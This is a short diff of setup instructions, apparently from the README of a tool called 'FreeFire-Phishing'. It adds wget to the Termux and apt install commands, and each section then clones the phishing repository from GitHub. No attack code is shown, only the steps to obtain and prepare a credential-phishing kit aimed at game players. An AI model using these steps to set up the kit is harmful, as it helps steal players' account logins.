@@ -99,7 +99,7 @@ pkg update -y
 
 pkg upgrade -y
 
-pkg install git 
+pkg install git wget
 
 git clone https://github.com/OnlineHacKing/FreeFire-Phishing.git
 
@@ -119,7 +119,7 @@ sudo apt update -y
 
 sudo apt upgrade -y
 
-sudo apt install git 
+sudo apt install git wget
 
 git clone https://github.com/OnlineHacKing/FreeFire-Phishing.git
 
